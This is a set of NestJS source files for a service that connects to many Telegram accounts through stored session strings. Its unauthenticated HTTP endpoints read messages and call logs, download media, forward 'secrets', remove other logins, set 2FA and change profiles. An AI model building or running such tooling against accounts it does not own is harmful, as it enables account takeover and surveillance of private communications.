updateClientDto);\r\n  }\r\n\r\n}\r\n","import { Module, Global, OnModuleDestroy, Inject, OnModuleInit } from '@nestjs/common';\r\nimport { ConfigModule } from '@nestjs/config';\r\nimport { MongooseModule, getConnectionToken } from '@nestjs/mongoose';\r\nimport { ConfigurationService } from './init.service';\r\nimport { ConfigurationSchema } from './configuration.schema';\r\nimport { ConfigurationController } from './init.controller';\r\nimport { Connection } from 'mongoose';\r\nimport { fetchWithTimeout, ppplbot } from '../../utils';\r\n\r\n@Global()\r\n@Module({\r\n  imports: [\r\n    ConfigModule.forRoot(), // Ensure ConfigModule is imported\r\n    MongooseModule.forRootAsync({\r\n      useFactory: () => ({\r\n        uri: process.env.mongouri,\r\n      }),\r\n    }),\r\n    MongooseModule.forFeature([{\r\n      name: 'configurationModule', collection: 'configuration', schema: ConfigurationSchema\r\n    }])\r\n  ],\r\n  providers: [ConfigurationService],\r\n  controllers: [ConfigurationController],\r\n  exports: [ConfigModule, MongooseModule],\r\n})\r\nexport class initModule implements OnModuleDestroy, OnModuleInit {\r\n  constructor(@Inject(getConnectionToken()) private readonly connection: Connection) {}\r\n  async onModuleInit() {\r\n    console.log(`Started :: ${process.env.clientId}`)\r\n    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Started :: ${process.env.clientId}`)}`);\r\n  }\r\n\r\n  async onModuleDestroy() {\r\n    console.log(\"Init Module Destroying\")\r\n    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`closed :: ${process.env.clientId}`)}`);\r\n    this.closeConnection();\r\n  }\r\n\r\n  private closeConnection() {\r\n    console.log(\"Closing mongoose connection\")\r\n    this.connection.close(true)\r\n  }\r\n}","import { Injectable, NotFoundException, OnModuleInit } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { Configuration } from './configuration.schema';\r\nimport { CloudinaryService } from '../../cloudinary';\r\n\r\n@Injectable()\r\nexport class ConfigurationService {\r\n    constructor(@InjectModel('configurationModule') private configurationModel: Model<Configuration>) {\r\n        this.setEnv()\r\n     }\r\n\r\n    async OnModuleInit() {\r\n       console.log(\"Config Module Inited\")\r\n    }\r\n\r\n    async findOne(): Promise<any> {\r\n        const user = await this.configurationModel.findOne({}).exec();\r\n        if (!user) {\r\n            throw new NotFoundException(`configurationModel not found`);\r\n        }\r\n        return user;\r\n    }\r\n\r\n    async setEnv() {\r\n        console.log(\"Setting Envs\");\r\n        const configuration: Configuration = await this.configurationModel.findOne({}, { _id: 0 });\r\n        const data = {...configuration}\r\n        for (const key in data) {\r\n            console.log('setting', key)\r\n            process.env[key] = data[key];\r\n        }\r\n        console.log(\"finished setting env\");\r\n    }\r\n\r\n    async update(updateClientDto: any): Promise<any> {\r\n        delete updateClientDto['_id']\r\n        const updatedUser = await this.configurationModel.findOneAndUpdate(\r\n            {}, // Assuming you want to update the first document found in the collection\r\n            { $set: { ...updateClientDto } },\r\n            { new: true, upsert: true }\r\n        ).exec();\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`configurationModel not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n}\r\n","import { Controller, Get, Post, Body, Param, Query, BadRequestException, Res } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiQuery, ApiParam, ApiBody, ApiResponse } from '@nestjs/swagger';\r\nimport { TelegramService } from './Telegram.service';\r\nimport * as fs from 'fs';\r\nimport { AddContactsDto } from './dto/addContacts.dto';\r\nimport { AddContactDto } from './dto/addContact.dto';\r\n\r\n@Controller('telegram')\r\n@ApiTags('Telegram')\r\nexport class TelegramController {\r\n    constructor(\r\n        private readonly telegramService: TelegramService\r\n    ) {}\r\n\r\n    async connectToTelegram(mobile: string) {\r\n        return await this.telegramService.createClient(mobile);\r\n    }\r\n\r\n    @Get('connect/:mobile')\r\n    @ApiOperation({ summary: 'Create and connect a new Telegram client' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 201, description: 'Client connected successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async connectClient(@Param('mobile') mobile: string): Promise<string> {\r\n        await this.connectToTelegram(mobile);\r\n        return 'Client connected successfully';\r\n    }\r\n\r\n    @Get('disconnect/:mobile')\r\n    @ApiOperation({ summary: 'Create and connect a new Telegram client' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 201, description: 'Client connected successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async disconnect(@Param('mobile') mobile: string): Promise<boolean> {\r\n        return await this.telegramService.deleteClient(mobile);\r\n    }\r\n\r\n    @Get('disconnectAll')\r\n    @ApiOperation({ summary: 'Create and connect a new Telegram client' })\r\n    //@apiresponse({ status: 201, description: 'Client connected successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async disconnectAll(): Promise<string> {\r\n        await this.telegramService.disconnectAll();\r\n        return 'Clients disconnected successfully';\r\n    }\r\n\r\n    @Get('messages/:mobile')\r\n    @ApiOperation({ summary: 'Get messages from Telegram' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'username', description: 'Username to fetch messages from', required: true })\r\n    @ApiQuery({ name: 'limit', description: 'Limit the number of messages', required: false })\r\n    //@apiresponse({ status: 200, description: 'Messages fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getMessages(@Param('mobile') mobile: string, @Query('username') username: string, @Query('limit') limit: number = 8) {\r\n        await this.connectToTelegram(mobile);\r\n        return this.telegramService.getMessages(mobile, username, limit);\r\n    }\r\n\r\n    @Get('messagesNew/:mobile')\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'chatId', description: 'Username to fetch messages from', required: true })\r\n    @ApiQuery({ name: 'limit', description: 'Limit the number of messages', required: false })\r\n    @ApiQuery({ name: 'offset', description: 'offset the number of messages', required: false })\r\n    async getMessagesNew(\r\n        @Param('mobile') mobile: string,\r\n        @Query('chatId') chatId: string,\r\n        @Query('offset') offset: number,\r\n        @Query('limit') limit: number = 20\r\n    ) {\r\n        await this.telegramService.createClient(mobile, false, false);\r\n        const messages = await this.telegramService.getMessagesNew(mobile, chatId, offset, limit);\r\n        return messages;\r\n    }\r\n\r\n    @Get('chatid/:mobile')\r\n    @ApiOperation({ summary: 'Get chat ID for a username' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'username', description: 'Username to fetch chat ID for', required: true })\r\n    //@apiresponse({ status: 200, description: 'Chat ID fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getChatId(@Param('mobile') mobile: string, @Query('username') username: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getChatId(mobile, username);\r\n    }\r\n\r\n    @Get('sendInlineMessage/:mobile')\r\n    @ApiOperation({ summary: 'Get chat ID for a username' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'chatId', description: 'chat ID of user', required: true })\r\n    @ApiQuery({ name: 'message', description: 'message ID of user', required: true })\r\n    @ApiQuery({ name: 'url', description: 'url ID of user', required: true })\r\n    async sendInlineMessage(@Param('mobile') mobile: string,\r\n        @Query('chatId') chatId: string,\r\n        @Query('message') message: string,\r\n        @Query('url') url: string,) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.sendInlineMessage(mobile, chatId, message, url);\r\n    }\r\n\r\n    @Get('lastActiveTime/:mobile')\r\n    @ApiOperation({ summary: 'Get Last Active time of a user' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    async lastActiveTime(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getLastActiveTime(mobile);\r\n    }\r\n\r\n    @Post('joinchannels/:mobile')\r\n    @ApiOperation({ summary: 'Join channels' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiBody({ description: 'Channels string', schema: { type: 'object', properties: { channels: { type: 'string' } } } })\r\n    //@apiresponse({ status: 200, description: 'Channels joined successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async joinChannels(@Param('mobile') mobile: string, @Body('channels') channels: string) {\r\n        await this.connectToTelegram(mobile);\r\n        // this.telegramService.joinChannels(mobile, channels);\r\n        return 'Joining Channels';\r\n    }\r\n\r\n    @Get('removeauths/:mobile')\r\n    @ApiOperation({ summary: 'Remove other authorizations' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Authorizations removed successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async removeOtherAuths(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        await this.telegramService.removeOtherAuths(mobile);\r\n        return 'Authorizations removed successfully';\r\n    }\r\n\r\n    @Get('selfmsgsinfo/:mobile')\r\n    @ApiOperation({ summary: 'Get self messages info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getSelfMsgsInfo(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getSelfMsgsInfo(mobile);\r\n    }\r\n\r\n    @Get('createGroup/:mobile')\r\n    @ApiOperation({ summary: 'Get self messages info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async createGroup(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.createGroup(mobile);\r\n    }\r\n\r\n    @Get('forwardSecrets/:mobile/:fromId')\r\n    @ApiOperation({ summary: 'Get self messages info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async forwardSecrets(@Param('mobile') mobile: string, @Param('fromId') fromId: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.forwardSecrets(mobile, fromId);\r\n    }\r\n\r\n    @Get('joinChannelAndForward/:mobile/:fromId/:channel')\r\n    @ApiOperation({ summary: 'Get self messages info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async joinChannelAndForward(@Param('mobile') mobile: string, @Param('fromId') fromId: string, @Param('channel') channel: string) {\r\n        await this.telegramService.createClient(mobile, false, false);\r\n        return await this.telegramService.joinChannelAndForward(mobile, fromId, channel);\r\n    }\r\n    @Get('leaveChannel/:mobile/:channel')\r\n    @ApiOperation({ summary: 'Get channel info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Channel info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async leaveChannel(@Param('mobile') mobile: string, @Param('channel') channel: string) {\r\n        await this.connectToTelegram(mobile);\r\n        this.telegramService.leaveChannel(mobile, channel);\r\n        return \"Started Leaving Channels\"\r\n    }\r\n\r\n    @Get('getCallLog/:mobile')\r\n    @ApiOperation({ summary: 'Get CallLog  info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getCallLog(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getCallLog(mobile);\r\n    }\r\n\r\n    @Get('getMe/:mobile')\r\n    @ApiOperation({ summary: 'Get me  info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getMe(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getMe(mobile);\r\n    }\r\n\r\n    @Get('getMedia/:mobile')\r\n    @ApiOperation({ summary: 'Get me  info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getMedia(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getmedia(mobile);\r\n    }\r\n\r\n    @Get('channelinfo/:mobile')\r\n    @ApiOperation({ summary: 'Get channel info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'sendIds', description: 'Whether to send IDs or not', required: false })\r\n    //@apiresponse({ status: 200, description: 'Channel info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getChannelInfo(@Param('mobile') mobile: string, @Query('sendIds') sendIds: boolean = false) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getChannelInfo(mobile, sendIds);\r\n    }\r\n\r\n    @Get('leaveChannels/:mobile')\r\n    @ApiOperation({ summary: 'Get channel info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Channel info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async leaveChannels(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        this.telegramService.leaveChannels(mobile);\r\n        return \"Started Leaving Channels\"\r\n    }\r\n\r\n    @Get('auths/:mobile')\r\n    @ApiOperation({ summary: 'Get authorizations' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Authorizations fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getAuths(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getAuths(mobile);\r\n    }\r\n\r\n    @Get('set2Fa/:mobile')\r\n    @ApiOperation({ summary: 'Set 2Fa' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: '2Fa set successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async set2Fa(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.set2Fa(mobile);\r\n    }\r\n\r\n    @Get('setprofilepic/:mobile/:name')\r\n    @ApiOperation({ summary: 'Set Profile Picture' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiParam({ name: 'name', description: 'Profile name', type: String })\r\n    async setProfilePic(\r\n        @Param('mobile') mobile: string,\r\n        @Param('name') name: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.setProfilePic(mobile, name)\r\n    }\r\n\r\n    @Get('updatePrivacy/:mobile')\r\n    @ApiOperation({ summary: 'Update Privacy Settings' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    async updatePrivacy(\r\n        @Param('mobile') mobile: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.updatePrivacy(mobile)\r\n    }\r\n\r\n    @Get('UpdateUsername/:mobile')\r\n    @ApiOperation({ summary: 'Update Username' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiQuery({ name: 'username', description: 'New username', type: String, required: false })\r\n    async updateUsername(\r\n        @Param('mobile') mobile: string,\r\n        @Query('username') username: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.updateUsername(mobile, username)\r\n    }\r\n\r\n    @Get('getGrpMembers/:mobile')\r\n    @ApiOperation({ summary: 'Update Username' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiQuery({ name: 'username', description: 'New username', type: String })\r\n    async getGrpMembers(\r\n        @Param('mobile') mobile: string,\r\n        @Query('username') username: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getGrpMembers(mobile, username)\r\n    }\r\n\r\n    \r\n\r\n    @Post('addcontact')\r\n    @ApiOperation({ summary: 'Add multiple contacts' })\r\n    @ApiBody({\r\n        description: 'Add contacts with a phone number array and a prefix for names',\r\n        type: AddContactDto\r\n    })\r\n    @ApiResponse({\r\n        status: 200,\r\n        description: 'Successfully added contacts.',\r\n        schema: {\r\n            example: {\r\n                success: true,\r\n                addedContacts: 5,\r\n            },\r\n        },\r\n    })\r\n    @ApiResponse({\r\n        status: 400,\r\n        description: 'Error adding contacts.',\r\n        schema: {\r\n            example: {\r\n                success: false,\r\n                error: 'Error message',\r\n            },\r\n        },\r\n    })\r\n    async addContact(@Body() addContactDto: AddContactDto) {\r\n        const { mobile, data, prefix } = addContactDto;\r\n        await this.connectToTelegram(mobile);\r\n        return this.telegramService.addContact(mobile, data, prefix);\r\n    }\r\n\r\n\r\n    @Post('addcontacts')\r\n    @ApiOperation({ summary: 'Add multiple contacts' })\r\n    @ApiBody({\r\n        description: 'Add contacts with a phone number array and a prefix for names',\r\n        type: AddContactsDto\r\n    })\r\n    @ApiResponse({\r\n        status: 200,\r\n        description: 'Successfully added contacts.',\r\n        schema: {\r\n            example: {\r\n                success: true,\r\n                addedContacts: 5,\r\n            },\r\n        },\r\n    })\r\n    @ApiResponse({\r\n        status: 400,\r\n        description: 'Error adding contacts.',\r\n        schema: {\r\n            example: {\r\n                success: false,\r\n                error: 'Error message',\r\n            },\r\n        },\r\n    })\r\n    async addContacts(@Body() addContactsDto: AddContactsDto) {\r\n        const { mobile, phoneNumbers, prefix } = addContactsDto;\r\n        await this.connectToTelegram(mobile);\r\n        return this.telegramService.addContacts(mobile, phoneNumbers, prefix);\r\n    }\r\n\r\n    @Get('newSession/:mobile')\r\n    @ApiOperation({ summary: 'Create new session' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    async newSession(\r\n        @Param('mobile') mobile: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.createNewSession(mobile)\r\n    }\r\n\r\n    @Get('updateNameandBio/:mobile')\r\n    @ApiOperation({ summary: 'Update Name' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiQuery({ name: 'firstName', description: 'First Name', type: String })\r\n    @ApiQuery({ name: 'about', description: 'About', type: String })\r\n    async updateName(\r\n        @Param('mobile') mobile: string,\r\n        @Query('firstName') firstName: string,\r\n        @Query('about') about: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.updateNameandBio(mobile, firstName, about)\r\n    }\r\n\r\n    @Get('metadata')\r\n    async getMediaMetadata(@Query('mobile') mobile: string, @Query('chatId') chatId: string, @Query('offset') offset: number, @Query('limit') limit: number) {\r\n        await this.telegramService.createClient(mobile, false, false);\r\n        return this.telegramService.getMediaMetadata(mobile, chatId, offset, limit);\r\n    }\r\n\r\n    @Get('download')\r\n    async downloadMediaFile(\r\n        @Query('mobile') mobile: string,\r\n        @Query('messageId') messageId: number,\r\n        @Query('chatId') chatId: string,\r\n        @Res() res: any\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        await this.telegramService.downloadMediaFile(mobile, messageId, chatId, res);\r\n    }\r\n\r\n    @Get('downloadProfilePic')\r\n    async downloadProfilePic(\r\n        @Query('mobile') mobile: string,\r\n        @Query('index') index: number,\r\n        @Res() res: any\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        try {\r\n            const filePath = await this.telegramService.downloadProfilePic(mobile, index);\r\n            if (!filePath) {\r\n                return res.status(404).send('Profile photo not found.');\r\n            }\r\n\r\n            res.download(filePath, 'profile_pic.jpg', (err) => {\r\n                if (err) {\r\n                    console.error('Error sending the file:', err);\r\n                    res.status(500).send('Error downloading the file.');\r\n                }\r\n\r\n                fs.unlink(filePath, (err) => {\r\n                    if (err) {\r\n                        console.error('Error deleting the file:', err);\r\n                    }\r\n                });\r\n            });\r\n        } catch (error) {\r\n            console.error('Error in endpoint:', error);\r\n            res.status(500).send('An error occurred.');\r\n        }\r\n    }\r\n\r\n\r\n    @Get('forward/:mobile/:chatId/:messageId')\r\n    @ApiOperation({ summary: 'Create new session' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiParam({ name: 'chatId', description: 'chatId of user', type: String })\r\n    @ApiParam({ name: 'messageId', description: 'messageId of message', type: String })\r\n    async forrward(\r\n        @Param('mobile') mobile: string,\r\n        @Param('chatId') chatId: string,\r\n        @Param('messageId') messageId: number,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.forwardMessage(mobile, chatId, messageId)\r\n    }\r\n\r\n    @Get('deleteChat/:mobile/:chatId')\r\n    @ApiOperation({ summary: 'Create new session' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiParam({ name: 'chatId', description: 'chatId of user', type: String })\r\n    async deleteChat(\r\n        @Param('mobile') mobile: string,\r\n        @Param('chatId') chatId: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.deleteChat(mobile, chatId)\r\n    }\r\n\r\n    @Get('deleteProfilePics/:mobile')\r\n    @ApiOperation({ summary: 'Create new session' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    async deleteProfilePics(\r\n        @Param('mobile') mobile: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.deleteProfilePhotos(mobile)\r\n    }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { TelegramController } from './Telegram.controller';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\r\nimport { TelegramService } from './Telegram.service';\r\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\r\nimport { ChannelsModule } from '../channels/channels.module';\r\n\r\n@Module({\r\n    imports: [\r\n        forwardRef(() => UsersModule),\r\n        BufferClientModule,\r\n        forwardRef(() => ActiveChannelsModule),\r\n        forwardRef(() => ChannelsModule)],\r\n    controllers: [TelegramController],\r\n    providers: [TelegramService],\r\n    exports: [TelegramService]\r\n})\r\nexport class TelegramModule { }\r\n","import { BufferClientService } from './../buffer-clients/buffer-client.service';\r\nimport { UsersService } from '../users/users.service';\r\nimport { contains, parseError, sleep } from \"../../utils\";\r\nimport TelegramManager from \"./TelegramManager\";\r\nimport { BadRequestException, HttpException, Inject, Injectable, OnModuleDestroy, forwardRef } from '@nestjs/common';\r\nimport { CloudinaryService } from '../../cloudinary';\r\nimport { Api, TelegramClient } from 'telegram';\r\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\r\nimport * as path from 'path';\r\nimport { ChannelsService } from '../channels/channels.service';\r\nimport { Channel } from '../channels/schemas/channel.schema';\r\nimport { EntityLike } from 'telegram/define';\r\n\r\n@Injectable()\r\nexport class TelegramService implements OnModuleDestroy {\r\n    private static clientsMap: Map<string, TelegramManager> = new Map();\r\n    constructor(\r\n        @Inject(forwardRef(() => UsersService))\r\n        private usersService: UsersService,\r\n        private bufferClientService: BufferClientService,\r\n        @Inject(forwardRef(() => ActiveChannelsService))\r\n        private activeChannelsService: ActiveChannelsService,\r\n        @Inject(forwardRef(() => ChannelsService))\r\n        private channelsService: ChannelsService,\r\n    ) {}\r\n\r\n    async onModuleDestroy() {\r\n        await this.disconnectAll();\r\n    }\r\n\r\n    public getActiveClientSetup() {\r\n        return TelegramManager.getActiveClientSetup();\r\n    }\r\n\r\n    public setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\r\n        TelegramManager.setActiveClientSetup(data);\r\n    }\r\n\r\n    public async getClient(number: string) {\r\n        const client = TelegramService.clientsMap.get(number);\r\n        try {\r\n            if (client && client.connected()) {\r\n                await client.connect()\r\n                return client\r\n            }\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n        return undefined;\r\n    }\r\n\r\n    public hasClient(number: string) {\r\n        return TelegramService.clientsMap.has(number);\r\n    }\r\n\r\n    async deleteClient(number: string) {\r\n        const cli = await this.getClient(number);\r\n        await cli?.disconnect();\r\n        console.log(\"Disconnected : \", number)\r\n        return TelegramService.clientsMap.delete(number);\r\n    }\r\n\r\n    async disconnectAll() {\r\n        const data = TelegramService.clientsMap.entries();\r\n        console.log(\"Disconnecting All Clients\");\r\n        for (const [phoneNumber, client] of data) {\r\n            try {\r\n                await client?.disconnect();\r\n                TelegramService.clientsMap.delete(phoneNumber);\r\n                console.log(`Client disconnected: ${phoneNumber}`);\r\n            } catch (error) {\r\n                console.log(parseError(error));\r\n                console.log(`Failed to Disconnect : ${phoneNumber}`);\r\n            }\r\n        }\r\n        TelegramService.clientsMap.clear();\r\n        // this.bufferClientService.clearBufferMap()\r\n        this.bufferClientService.clearJoinChannelInterval()\r\n    }\r\n\r\n    async createClient(mobile: string, autoDisconnect = true, handler = true): Promise<TelegramManager> {\r\n        const user = (await this.usersService.search({ mobile }))[0];\r\n        if (!user) {\r\n            throw new BadRequestException('user not found');\r\n        }\r\n        if (!this.hasClient(mobile)) {\r\n            let telegramManager = new TelegramManager(user.session, user.mobile);\r\n            let client: TelegramClient\r\n            try {\r\n                client = await telegramManager.createClient(handler);\r\n                await client.getMe();\r\n                if (client) {\r\n                    TelegramService.clientsMap.set(mobile, telegramManager);\r\n                    if (autoDisconnect) {\r\n                        setTimeout(async () => {\r\n                            if (client.connected || await this.getClient(mobile)) {\r\n                                console.log(\"SELF destroy client : \", mobile);\r\n                                await telegramManager.disconnect();\r\n                            } else {\r\n                                console.log(\"Client Already Disconnected : \", mobile);\r\n                            }\r\n                            TelegramService.clientsMap.delete(mobile);\r\n                        }, 180000)\r\n                    } else {\r\n                        setInterval(async () => {\r\n                            //console.log(\"destroying loop :\", mobile)\r\n                            //client._destroyed = true\r\n                            // if (!client.connected) {\r\n                            // await client.connect();\r\n                            //}\r\n                        }, 20000);\r\n                    }\r\n                    return telegramManager;\r\n                } else {\r\n                    throw new BadRequestException('Client Expired');\r\n                }\r\n            } catch (error) {\r\n                console.log(\"Parsing Error\");\r\n                if (telegramManager) {\r\n                    await telegramManager.disconnect();\r\n                    telegramManager = null;\r\n                    TelegramService.clientsMap.delete(mobile);\r\n                }\r\n                const errorDetails = parseError(error);\r\n                if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\r\n                    console.log(\"Deleting User: \", user.mobile);\r\n                    await this.usersService.updateByFilter({ $or: [{ tgId: user.tgId }, { mobile: mobile }] }, { expired: true });\r\n                } else {\r\n                    console.log('Not Deleting user');\r\n                }\r\n                throw new BadRequestException(errorDetails.message)\r\n            }\r\n        } else {\r\n            console.log(\"Client Already exists\")\r\n            return await this.getClient(mobile)\r\n        }\r\n    }\r\n\r\n    async getMessages(mobile: string, username: string, limit: number = 8) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return telegramClient.getMessages(username, limit);\r\n    }\r\n\r\n\r\n    async getMessagesNew(mobile: string, username: string, offset: number, limit: number) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return telegramClient.getMessagesNew(username, offset, limit);\r\n    }\r\n\r\n    async sendInlineMessage(mobile: string, chatId: string, message: string, url: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return telegramClient.sendInlineMessage(chatId, message, url);\r\n    }\r\n\r\n    async getChatId(mobile: string, username: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getchatId(username);\r\n    }\r\n\r\n    async getLastActiveTime(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getLastActiveTime();\r\n    }\r\n\r\n    // async joinChannels(mobile: string, channels: Channel[]) {\r\n    //     console.log(\"Started Joining- \", mobile, \" - channelsLen - \", channels.length);\r\n\r\n    //     const joinChannelWithDelay = async (index: number) => {\r\n    //         const telegramClient = await this.createClient(mobile, false, false)\r\n    //         if (index >= channels.length) {\r\n    //             console.log(mobile, \" - finished joining channels\");\r\n    //             await this.deleteClient(mobile);\r\n    //             console.log(\"Join channel stopped : \", mobile);\r\n    //             return;\r\n    //         }\r\n\r\n    //         console.log(mobile, \" - Will Try next now\");\r\n    //         const channel = channels[index]\r\n    //         const username = channel.username;\r\n    //         console.log(mobile, \"Trying: \", username);\r\n    //         try {\r\n    //             await tryJoiningChannel(telegramClient, channel, username, mobile);\r\n    //         } catch (error) {\r\n    //             parseError(error, \"Outer Err: \");\r\n    //             await this.removeChannels(error, channel.channelId, channel.username);\r\n    //         }\r\n    //         console.log(mobile, \" - On waiting period\");\r\n    //         await this.deleteClient(mobile)\r\n    //         this.joinChannelTimeoutId = setTimeout(async () => {\r\n    //             joinChannelWithDelay(index + 1);\r\n    //         }, 3 * 60 * 1000);\r\n    //     };\r\n\r\n\r\n\r\n    //     joinChannelWithDelay(0);\r\n    //     return 'Channels joining in progress';\r\n    // }\r\n    async tryJoiningChannel(mobile: string, chatEntity: Channel) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        try {\r\n            await 